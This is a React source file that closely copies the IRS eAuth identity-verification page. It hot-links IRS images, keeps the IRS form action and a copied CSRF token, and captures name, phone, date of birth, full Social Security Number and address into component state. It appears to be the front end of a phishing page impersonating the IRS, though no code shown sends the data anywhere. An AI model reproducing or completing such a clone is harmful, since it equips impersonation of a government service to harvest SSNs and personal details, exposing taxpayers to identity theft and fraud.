import { useState } from 'react'
import './index.css'

const App = () => {

    const [firstName, setFirstName] = useState('')
    const [lastName, setLastName] = useState('')
    const [phone, setPhone] = useState('')
    const [dobMonth, setDobMonth] = useState('')
    const [dobDay, setDobDay] = useState('')
    const [ssn1, setSsn1] = useState('')
    const [ssn2, setSsn2] = useState('')
    const [ssn3, setSsn3] = useState('')
    const [address1, setAddress1] = useState('')
    const [address2, setAddress2] = useState('')
    const [city, setCity] = useState('')
    const [zipcode, setZipcode] = useState('')

    return (
        <>
        <div id="main-longform">
 		
		
			
		{/* <!-- PageIdentifier: HEADER --> */}

    




   
 








	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
	
		
	



	
		
	
	








	




{/* <script type="text/javascript" language="Javascript">  
if (top != self) { 
	top.location = self.location;
}
</script> */}

<div className="headerBar">
	
	<img src="https://sa.www4.irs.gov/eauth/pub/common/images/logo.png" alt="" style={{transform: 'translateX(168%)'}}/>
		
		
		
	<div id="access" tabindex="1"></div>	
		
</div>



<div id="mainsearch">

	
	
	
	
	

	
	

		
	
	

	
	
	
	
	
		
	
		
</div>

 
		
		<div id="content">
		
			<h1 className="title">
				Help us verify your identity with some basic information
			</h1>
			 
			<div id="error_message">
					
					
					
					
					
					
					
					
			</div>

			<form method="post" id="IDProofForm"  name="IDProofForm" autocomplete="off"
					action="/eauth/eauthController.jsp?actionName=IDProofProxy"
					onSubmit="return isValidIDProofing(this);">

			{/* <!-- FORM HEADER TEXT --> */}

			<div className="instruction">
				
					
					
						
						<br /><br />
						If we are not able to match the information you enter with our records, you will not be able to use this online service.
					
				
			</div>
			
			<div id="form_content">
			
			<h2 className="title">Personal Information</h2>
			
			<p>
				All information should match your latest tax return.
			</p>
			

				{/* <!-- HIDDEN FIELDS --> */}
				

				{/* <!-- FIRST NAME --> */}

				<div className="fieldset">

					<fieldset>						

						<legend><span className="access-label">
							User Name Information
						</span></legend>

						<p>

							
							<label for="first_name">
								First Name
							</label>
							<input type="text" id="first_name" name="first_name"
							size="50" maxlength="50"  
                            tabindex="0" className="textbox " 
                            // textbox-readonly
                                 value={firstName}
                                 onChange={e => setFirstName(e.target.value)} />
									 	
					
					
									 	
							{/* &nbsp;<a href="#" id="first_name_link"
							 className="edit-link-display" 
							onClick="makeEditable('first_name', 'textbox');
					 		   		linkStyleChanger('first_name_link');							
									return false"
							 tabindex="0" title="Edit First Name">
			 			
						<img src="https://sa.www4.irs.gov/eauth/pub/common/images/icon_pencil.gif"
						 alt="Edit First Name" border="0" />&nbsp;Edit
						 </a> */}
						</p>
								
						{/* <!-- LAST NAME --> */}

						<p>

							
							<label for="last_name">
								Last Name
							</label>
							<input type="text" id="last_name" name="last_name"
							size="50" maxlength="50"
                            tabindex="0" className="textbox " 
                            // textbox-readonly
                                 value={lastName}
                                 onChange={e => setLastName(e.target.value)} />
									 	
					
					
									 	
							{/* &nbsp;<a href="#" id="last_name_link"
							 className="edit-link-display" 
							onClick="makeEditable('last_name', 'textbox');
					 		   		linkStyleChanger('last_name_link');							
									return false"
							 tabindex="0" title="Edit Last Name">
			 			
						<img src="https://sa.www4.irs.gov/eauth/pub/common/images/icon_pencil.gif"
						 alt="Edit Last Name" border="0" />&nbsp;Edit
						 </a>									 	 */}
						</p>
						
						
						<input type="hidden" name="email"
						 id="email" value="" />

					</fieldset>

				</div>
				
					{/* <!--  DATE OF BIRTH: MONTH/DAY/YEAR --> */}
					
					

 
					<p><label for="phonenumber">
						Phone Number
					</label>
						
						<input type="tel" className="textbox " id="phone" name="phone"
						required
						tabindex="0" maxlength="15"
						value={phone}
                        onChange={e => setPhone(e.target.value)} /></p>



	
		
	
	






				{/* <!-- DATE OF BIRTH --> */}

				<div id="fieldset">

					<fieldset>

						<legend className="access-label">
							Date of Birth
						</legend>
						
						<span id="dob_fieldset" className="pseudo-label">
							Date of Birth
						</span>

						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
					
						<div className="small-field-nosize">
							
							<label className="access-label" for="month">
								Month
							</label>
							<select name="month" style={{width: "auto"}} 
							tabindex="0" aria-labelledby="dob_fieldset"
							className="select-style"
                            value={dobMonth}
      onChange={e => setDobMonth(e.currentTarget.value)}>
								
                                <option value="01">
											01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>

									{/* <script type="text/javascript">
										document.writeln(displayArrayAsHTMLDropdown(months));
									</script> */}
									
							</select>

						</div>
						
						<div className="small-field-nosize">

							<label className="access-label" for="day">
								Day
							</label>
							
							
							<select name="day" id="day" style={{width: "auto"}}
							tabindex="0" aria-labelledby="dob_fieldset"
                             className="select-style"
                             value={dobDay}
                             onChange={e => setDobDay(e.currentTarget.value)}>
                                 <option value="01">
									01
										</option>
										<option value="02">
											02
										</option>
										<option value="03">
											03
										</option>
										<option value="04">
											04
										</option>
										<option value="05">
											05
										</option>
										<option value="06">
											06
										</option>
										<option value="07">
											07
										</option>
										<option value="08">
											08
										</option>
										<option value="09">
											09
										</option>
										<option value="10">
											10
										</option>
										<option value="11">
											11
										</option>
										<option value="12">
											12
										</option>
										<option value="13">
											13
										</option>
										<option value="14">
											14
										</option>
										<option value="15">
											15
										</option>
										<option value="16">
											16
										</option>
										<option value="17">
											17
										</option>
										<option value="18">
											18
										</option>
										<option value="19">
											19
										</option>
										<option value="20">
											20
										</option>
										<option value="21">
											21
										</option>
										<option value="22">
											22
										</option>
										<option value="23">
											23
										</option>
										<option value="24">
											24
										</option>
										<option value="25">
											25
										</option>
										<option value="26">
											26
										</option>
										<option value="27">
											27
										</option>
										<option value="28">
											28
										</option>
										<option value="29">
											29
										</option>
										<option value="30">
											30
										</option>
										<option value="31">
											31
										</option>
							
								{/* <script type="text/javascript">
									document.writeln(displayDaysArrayAsHTMLDropdown());
								</script> */}
								
							</select>

						</div>
					
						<div className="small-field-nosize">

							<label className="access-label" for="year">
								Year (format: YYYY)
							</label>
							
							
							
							
								<input type="text" className="textbox-nosize " name="year" placeholder="Year" size="4" maxlength="4" id="year" required tabindex="0" aria-labelledby="dob_fieldset" />
							
							
							

						</div>

					</fieldset>

					</div> 

					{/* <!--  SOCIAL SECURITY NUMBER --> */}
					 
					

 




	
		
	
	







				<div id="ssn_fieldset" className="fieldset">

					<fieldset>						

						<input type="hidden" id="ssn1x" name="ssn1x" value="" />
						<input type="hidden" id="ssn2x" name="ssn2x" value="" />
						<input type="hidden" id="ssn3x" name="ssn3x" value="" />
						
						<input type="hidden" id="ssn" name="ssn" value="" />
						
						<label for="ssn_fieldset">
							
							
							Social Security Number (SSN) or&nbsp;
							
							
						 <a href="https://sa.www4.irs.gov/eauth/pub/help/itin.jsp" target="_blank" tabindex="0"
						  id="help-link" className="help" title="Individual Tax ID Number (ITIN)">
						  Individual Tax ID Number (ITIN)
						 </a>
						 </label>
						
						
						
							
						
						
						
							
						
						<input tabindex="0" type="password" name="ssn1" id="ssn1" size="3" maxlength="3"
							autocomplete="off"
							onKeyUp="combineSSN(); return ssnJump(this, event)"
                            value={ssn1}
                            onChange={e => setSsn1(e.target.value)} style={{width:"auto"}} className="textbox" required />
							-
						<input tabindex="0" type="password" name="ssn2" id="ssn2" size="2" maxlength="2" 
							autocomplete="off"
							onKeyUp="combineSSN(); return ssnJump(this, event)"
							value={ssn2} 
                            onChange={e => setSsn2(e.target.value)} style={{width:"auto"}} className="textbox" required />
							-
						<input tabindex="0" type="text" name="ssn3" id="ssn3" size="4" maxlength="4"
							autocomplete="off"
							onKeyUp="ssnRemoveNonDigits(this); combineSSN()"
                            value={ssn3}
                            onChange={e => setSsn3(e.target.value)}  style={{width:"auto"}} className="textbox" required  />
			
						<label for="ssn1" className="access-label">
							Please enter the first three digits of your Social Security Number.
						</label>
						<label for="ssn2" className="access-label">
							Please enter the second two digits of your Social Security Number.
						</label>
						<label for="ssn3" className="access-label">
							Please enter the last four digits of your Social Security Number.
						</label>
						

					</fieldset>

				</div>
				<br />
					
					{/* <!-- TAX FILER INDICATOR --> */}
					
					<h2 className="title">
						Filing Status
					</h2>

					<div className="fieldset">

						<fieldset>
						
						<legend className="access-label" style={{position:"relative !important"}}>
							Filing Status Information
						</legend>
				
							<p>
								
								
								
								<label for="tax_filer_true" className="inline unbold no-outline tax-filer-true-style">
								<input type="radio" name="xtax_filer" value="true"
								onClick="changeAddress01Display('block'); displayImgHTML();
										 addVisualFocusIndicator(this, true);
										 handleAddressSubheader();
										 toggleAddressHelpLink()" value="true"
								onBlur="this.style.outline = ''"
                                onFocus="addVisualFocusIndicator(this, true);" 
								 tabindex="0" id="tax_filer_true" />
								 I have filed a tax return in the past seven years
							</label>
							</p>
							
							<input type="hidden" id="tax_filer" name="tax_filer" value="" />

					
						
						
						
							<p>
								<label for="tax_filer_false" className="unbold no-outline tax-filer-true-style">
								<input type="radio" name="xtax_filer" onClick="changeAddress01Display('block');
																			    addVisualFocusIndicator(this, true);
																				handleAddressSubheader();
																				toggleAddressHelpLink();
																				displayImgHTML()"
									 value="false"
									 onBlur="this.style.outline = ''"
									 onFocus="addVisualFocusIndicator(this, true);"  
									 
									 tabindex="0" id="tax_filer_false" />
								I have not filed a tax return in the past seven years
							</label>
							</p>
							
					
								
						</fieldset>
					</div>

					
					{/* <!--  ADDRESS INFORMATION --> */}
					
					<h2 className="title">
						Address Information
					</h2>
					
					<p>
						<span id="is_tax_filer_display" className="address-subheader1-display">
									Your address must match your most recently filed tax return. &nbsp;
									
						
							<a 
							href="https://www.irs.gov/uac/Taxpayer-Identity-Verification-Information#formataddress" 
								tabindex="0"
								target="_new" id="address_help"
							title="Address Help" className="help bold-help-link">Address Help</a>
									
						</span>
						<span id="is_tax_nonfiler_display" className="address-subheader2-display">
							If you have not filed in the past 7 years, provide your current mailing address.
						</span>
					</p>
							
					<div className="fieldset">

						<fieldset>
							<legend><span className="access-label"><b>
								Address Information
							</b></span></legend>
							
							{/* <!-- ADDRESS LINE 1 --> */}

							<p><label for="address1">
								Address Line 1
							</label>
								
								<input type="text" className="textbox address-textbox" id="address1" name="address1"
								required
								tabindex="0" maxlength="100"
                                value={address1}
                                onChange={e => setAddress1(e.target.value)} /></p>
									

							{/* <!-- ADDRESS LINE 2 --> */}

							<p><label for="address2">
								Address Line 2 (Optional)
							</label>
							
			 					<input type="text" className="textbox address-textbox" id="address2" name="address2"
			 					tabindex="0" maxlength="100"
                                value={address2}
                                onChange={e => setAddress2(e.target.value)} /></p>
									

							{/* <!-- CITY --> */}

							<p><label for="city">
								City
							</label>
								
								<input type="text" className="textbox city-textbox" id="city" name="city" required
								tabindex="0" size="50" maxlength="50"
                                value={city}
                                onChange={e => setCity(e.target.value)} /></p>

							<p>
								
							{/* <!-- U.S. STATE --> */}
								
								<div className="small-field-nosize">
								<label for="state" id="stateLabel">
									State / Territory
								</label>
								
								
								
								<select id="state" name="state"
								tabindex="0" className="select-style">
									<option value=""></option>
									
										{/* <script type="text/javascript">
											if (states.isIndexOffset()) states = states.reindex();
											document.writeln(displayArrayAsHTMLDropdown(states));
										</script> */}

								</select>
							</div>
							
							{/* <!-- ZIP OR POSTAL CODE --> */}

							<div className="small-field-nosize">

								<label for="zip" id="zipLabel">
									ZIP Code
								</label>
								
								<input type="text" className="textbox zip-textbox" tabindex="0"
                                    name="zip" id="zip" value={zipcode} 
                                    onChange={e => setZipcode(e.target.value)}
                                    required
									size="5" maxlength="5" />
								</div>
							
						{/* <!-- COUNTRY --> */}
							
							<div className="small-field-nosize">
							<label for="country">
								Country
							</label>								
								<select id="country" name="country" 
										className="select-style" tabindex="0"
										>

									<option value=""></option>

									{/* <script type="text/javascript">
									
										document.writeln(displayArrayAsHTMLDropdown(countries, 'United States'));
									</script>  */}

								</select>
							</div>
							
								
								                                
                                </p>

                        <p>&nbsp;</p>

                        <p>&nbsp;</p>

                       </fieldset>
                    </div>
                    
                    
					
					<span className="vertical-divider"></span>

					{/* <!-- SUBMIT BUTTONS --> */}
						<p>
							
							
							
							<input type="image" name="continue" id="continue"
								 alt="Continue" className="yes_button_position" 
								onFocus="addVisualFocusIndicator(this, true)"
								onBlur="this.style.border = ''"
								onClick="addVisualFocusIndicator(this, true)"
								src="https://sa.www4.irs.gov/eauth/pub/common/images/button_continue.jpg" 
								value="Continue" 
								tabindex="0" 
							/>
							
							<span className="button-divider"></span>
						
							
							
							
							{/* <button type="button" name="cancel" id="cancel" value="Cancel" className="no_button_position no-button" 
								tabindex="0" 
								onclick="backClicked('/eauth/pub/login.jsp'); return false">
  								<img alt="Cancel"
  									src="https://sa.www4.irs.gov/eauth/pub/common/images/button_cancel.jpg"/>
							</button> */}
						</p>
		
				
				
				
				
					
				
				
				<input type="hidden"
				 id="EAUTH_CSRF_SECURITY_TOKEN_PARAM"
				 name="EAUTH_CSRF_SECURITY_TOKEN_PARAM" value="UuKFKKNCAqWZf9Cv" />
				</div> 
                {/* <!-- END OF FORM-CONTENT --> */}
 
			</form>	
 
		</div>
		
		
			
		

 




	
		
	
	









<div className="footerBar" role="contentinfo">
<p>
<ul>

	<li>
		<a href="https://www.irs.gov/secureaccess" tabindex="0" target="_blank">
			Help</a>	
	</li> |
	
	<li>
		<a href="http://www.irs.gov/uac/IRS-Privacy-Policy" tabindex="0" target="_blank">
			IRS Privacy Policy</a>
	</li> |
	
	<li>
		<a href="https://sa.www4.irs.gov/eauth/pub/help/sec_code_terms_conditions.jsp" target="_blank" tabindex="0">
			  Security Code Terms and Conditions</a>
	</li>
	 |
	
	<li>
    <a href="https://sa.www4.irs.gov/eauth/pub/help/accessibility.jsp"  
		tabindex="0" 
		target="_blank"
		rel="noreferrer">
			  Accessibility</a>
	</li>
			  
	

</ul>	
</p>
</div>
	</div>
    // {/* <!-- The Modal -->  */}


 




	
		
	
	








{/* 


<div role="dialog" id="sessionWarningDialog" aria-labelledby="Session Expiration Notice" 
	aria-modal="true" className="hidden">
	<h2 className="dialog_title" style={{textAlign: 'left', paddingLeft: '17px'}}>Session Expiration Notice </h2>
	<div className="dialog_form">
		<p style={{padding: '2px', margin: '0px'}} align="left">
			Your session will expire in 5 minutes at  <span id="SessionExpTime"></span> Do you need more time? 
		</p>
	</div>
	<div className="dialog_form_actions">
		
			<button type="button" id="continue" name="continue" tabindex="0" aria-label="Yes" className="dialog_yes_button_position dialog_yes_button"  
				onclick="sendHttpRequest(window.location.href); getSessionExpirationTime(); setTimeout(function() { openDialog('sessionWarningDialog', this, 'continue'); }, sessionTimeoutWarningInterval); cancelTimeoutRedirection(); setupTimeoutRedirection(); closeDialog(this);">
  				<img alt="Yes" 
  					src="https://sa.www4.irs.gov/eauth/pub/common/images/button_yes.jpg"/>
			</button>
		
		
		<button type="button" name="no" tabindex="0" aria-label="No" className="dialog_close_button"   
			onclick="closeDialog(this);">
  			<img alt="No" 
  				src="https://sa.www4.irs.gov/eauth/pub/common/images/button_x.jpg"/>
		</button>
	</div>
</div>  */}
</>
    )
}

export default App